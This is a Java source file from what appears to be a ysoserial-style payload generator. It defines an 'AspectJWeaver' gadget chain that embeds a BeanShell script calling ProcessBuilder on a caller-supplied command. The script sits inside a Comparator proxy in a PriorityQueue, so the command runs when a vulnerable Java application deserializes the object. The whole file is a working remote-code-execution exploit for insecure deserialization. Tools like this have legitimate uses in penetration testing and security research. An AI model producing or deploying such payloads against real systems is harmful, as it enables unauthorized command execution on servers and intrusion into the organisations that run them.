package com.ppp.chain.aspectjweaver;

import bsh.Interpreter;
import bsh.XThis;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import com.ppp.utils.Strings;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;


@Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
@Authors({Authors.JANG})
@Sink({Sink.Command})
public class AspectJWeaver implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(AspectJWeaver.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
//        // sink
//        Object sinkObject = SinkScheduler.builder(sinksHelper);

        String command = sinksHelper.getCommand();

        Object kickOffObject = getChain(command);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        String s = RanDomUtils.generateRandomString(1);
        String s1 = RanDomUtils.generateRandomString(3, 6);

        // BeanShell payload
        String payload = String.format("compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{%s}).start();return new Integer(1);}", Strings.join(
                Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"").split(" ")),
                ",", "\"", "\""));

        // Create Interpreter
        Interpreter i = new Interpreter();

        Method method = i.getClass().getDeclaredMethod("setu", String.class, Object.class);
        method.setAccessible(true);
        method.invoke(i, "bsh.cwd", s1);

        // Evaluate payload
        i.eval(payload);

        // Create InvocationHandler
        XThis xt = new XThis(i.getNameSpace(), i);
        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

        // Create Comparator Proxy
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[]{s, s};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;
    }
}
